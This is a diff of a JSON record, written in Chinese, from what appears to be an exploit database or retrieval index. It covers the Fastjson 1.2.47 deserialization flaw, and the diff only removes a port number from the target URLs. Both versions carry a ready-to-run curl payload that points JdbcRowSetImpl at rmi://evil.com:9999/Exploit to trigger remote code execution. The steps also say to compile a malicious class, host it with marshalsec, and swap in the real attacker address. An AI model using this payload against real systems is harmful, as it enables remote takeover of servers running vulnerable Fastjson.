@@ -23,7 +23,7 @@
   "common_endpoints": [
     "/"
   ],
-  "detection_method": "向目标发送一个包含@type字段的JSON POST请求，观察响应是否包含fastjson相关错误信息或正常解析。例如：发送POST请求到http://{TARGET}:8090/，Content-Type: application/json，Body: {\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"}，如果响应包含fastjson解析错误或正常返回，可能表示漏洞存在。",
+  "detection_method": "向目标发送一个包含@type字段的JSON POST请求，观察响应是否包含fastjson相关错误信息或正常解析。例如：发送POST请求到http://{TARGET}/，Content-Type: application/json，Body: {\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"}，如果响应包含fastjson解析错误或正常返回，可能表示漏洞存在。",
   "exploit_steps": [
     {
       "step": 1,
@@ -42,12 +42,12 @@
     {
       "step": 3,
       "description": "向目标服务器发送恶意JSON payload，触发JNDI注入，执行远程命令。",
-      "command": "curl -X POST http://{TARGET}:8090/ -H \"Content-Type: application/json\" -d '{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://evil.com:9999/Exploit\",\"autoCommit\":true}}'",
+      "command": "curl -X POST http://{TARGET}/ -H \"Content-Type: application/json\" -d '{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://evil.com:9999/Exploit\",\"autoCommit\":true}}'",
       "expected_result": "目标服务器连接RMI服务器，加载并执行TouchFile.class中的命令（如touch /tmp/success），在目标服务器上创建文件/tmp/success。",
       "notes": "确保目标环境为openjdk:8u102或类似版本，没有com.sun.jndi.rmi.object.trustURLCodebase限制；evil.com需替换为实际攻击机地址。"
     }
   ],
-  "verification_command": "curl -X POST http://{TARGET}:8090/ -H \"Content-Type: application/json\" -d '{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"}'",
+  "verification_command": "curl -X POST http://{TARGET}/ -H \"Content-Type: application/json\" -d '{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"}'",
   "verification_success_sign": "响应可能包含fastjson解析信息或无错误返回，结合后续RCE验证（如检查目标服务器上是否创建了/tmp/success文件）。",
   "requires_callback": true,
   "callback_note": "此漏洞利用JNDI注入，需要目标服务器回连攻击机的RMI服务器来加载恶意类。替代方案：如果目标环境有trustURLCodebase限制，可尝试使用本地类路径或其它JNDI利用方式，但资料中未提供具体变体。",
@@ -60,7 +60,7 @@
     "fastjson",
     "web"
   ],
-  "search_text": "Fastjson 1.2.47及之前版本存在反序列化漏洞，攻击者可通过特殊构造的JSON字符串绕过白名单检测，利用JNDI注入实现远程命令执行。 java_deserialization fastjson 1.2.47 fastjson 1.2.47 fastjson deserialization fastjson rce fastjson jndi fastjson application/json spring web java json parser 向目标发送一个包含@type字段的JSON POST请求，观察响应是否包含fastjson相关错误信息或正常解析。例如：发送POST请求到http://{TARGET}:8090/，Content-Type: application/json，Body: {\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"}，如果响应包含fastjson解析错误或正常返回，可能表示漏洞存在。 Fastjson <= 1.2.47 java deserialization rce jndi fastjson web 编译并上传恶意Java类文件到攻击者控制的服务器，例如TouchFile.class，用于执行命令（如touch /tmp/success）。 使用marshalsec工具启动RMI服务器，监听指定端口（如9999），并指定加载远程恶意类。 向目标服务器发送恶意JSON payload，触发JNDI注入，执行远程命令。",
+  "search_text": "Fastjson 1.2.47及之前版本存在反序列化漏洞，攻击者可通过特殊构造的JSON字符串绕过白名单检测，利用JNDI注入实现远程命令执行。 java_deserialization fastjson 1.2.47 fastjson 1.2.47 fastjson deserialization fastjson rce fastjson jndi fastjson application/json spring web java json parser 向目标发送一个包含@type字段的JSON POST请求，观察响应是否包含fastjson相关错误信息或正常解析。例如：发送POST请求到http://{TARGET}/，Content-Type: application/json，Body: {\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"}，如果响应包含fastjson解析错误或正常返回，可能表示漏洞存在。 Fastjson <= 1.2.47 java deserialization rce jndi fastjson web 编译并上传恶意Java类文件到攻击者控制的服务器，例如TouchFile.class，用于执行命令（如touch /tmp/success）。 使用marshalsec工具启动RMI服务器，监听指定端口（如9999），并指定加载远程恶意类。 向目标服务器发送恶意JSON payload，触发JNDI注入，执行远程命令。",
   "embedding": [
     0.1678820550441742,
     -0.12332122027873993,
